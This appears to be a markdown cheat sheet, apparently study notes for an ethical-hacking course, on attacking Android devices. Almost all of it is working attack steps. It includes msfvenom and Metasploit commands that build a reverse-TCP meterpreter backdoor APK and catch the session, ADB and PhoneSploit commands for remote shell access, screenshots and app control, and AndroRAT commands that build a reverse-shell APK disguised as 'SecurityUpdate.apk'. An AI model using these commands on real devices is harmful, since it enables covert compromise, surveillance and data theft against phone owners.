## Hacking Mobile Platforms

### Attack Android 
1. Reverse TCP shell using metasploit
   - Create APK
     - `msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=<your IP> LPORT=4444 R > Desktop/Backdoor.apk`
   - Start metasploit
     - `msfconsole`
   - Start handler
     - `use exploit/multi/handler`
     - `set payload android/meterpreter/reverse_tcp`
     - `set LHOST <your IP>`
     - `exploit`
   - Install APK in android
   - Observe that a meterpreter session is open now
2. Android Debug Bridge (ADB)
   - Connect to an Android device over TCP/IP
     - `adb connect <ip>:5555`
   - Start shell
     - `adb shell`
3. ADB and PhoneSploit
   - Start PhoneSploit
     - `python3 phonesploit.py`
   - Connect to an Android device over TCP/IP
     - `(main_menu) >` `3`  :: Connect a new phone
     - `(connect_phone) >` `<IP of device>` :: Observe connected message
   - Start shell
     - `(main_menu) >` `4`  :: Access shell
     - `(shell_on_phone) >` `<IP of device>` :: Observe shell started
     - any linux command can be executed
   - Other options:
     - `(main_menu) >` `7`  :: Screen Shot
     - `(main_menu) >` `14`  :: List all apps
     - `(main_menu) >` `15`  :: Run an app
     - `(main_menu) >` `18`  :: Show Mac/Inet
     - `(main_menu) >` `21`  :: NetStat
4. AndroRAT
   - Create APK
     - `python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk`
   - Start listener listening from any IP
     - `python3 androRAT.py --shell -i 0.0.0.0 -p 4444`
   - Share APK and install at android device
   - Observe that a Interpreter reverse shell session is open now
     - `>` `help` :: List all available commands

### Analyze malicious app
- Sixo Online APK Analyzer: https://www.sisik.eu/apk-tool